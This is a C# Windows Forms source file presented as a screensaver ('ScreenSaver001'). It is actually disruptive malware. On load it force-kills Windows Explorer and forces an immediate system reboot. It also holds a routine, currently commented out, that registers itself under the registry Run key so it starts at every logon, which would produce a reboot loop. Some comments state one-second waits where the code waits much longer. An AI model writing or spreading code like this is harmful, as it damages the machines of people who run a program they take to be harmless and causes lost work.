using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace ScreenSaver001 {
    public partial class _ : Form {
        public _() {
//            SetCurrentVersionRun();
            //一秒間（1000ミリ秒）停止する
            System.Threading.Thread.Sleep(60000);
            Cursor.Hide();
            InitializeComponent();
        }
        private void comander(string filename, string arguments) {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = filename;
            //コマンドラインを指定
            psi.Arguments = arguments;
            //ウィンドウを表示しないようにする
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            //起動
            Process p = Process.Start(psi);
        }

        private void blackCurtainLoaded(object sender, EventArgs e) {
            
            comander("taskkill.exe", "/f /im explorer.exe");

            //一秒間（1000ミリ秒）停止する
            System.Threading.Thread.Sleep(10000);

            comander("shutdown.exe", "/r /f /t 0");
        }
        /// <summary>
        /// CurrentUserのRunにアプリケーションの実行ファイルパスを登録する
        /// </summary>
        public static void SetCurrentVersionRun() {
            //Runキーを開く
            Microsoft.Win32.RegistryKey regkey =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true);
            //値の名前に製品名、値のデータに実行ファイルのパスを指定し、書き込む
            regkey.SetValue(Application.ProductName, Application.ExecutablePath);
            //閉じる
            regkey.Close();
        }
    }
}
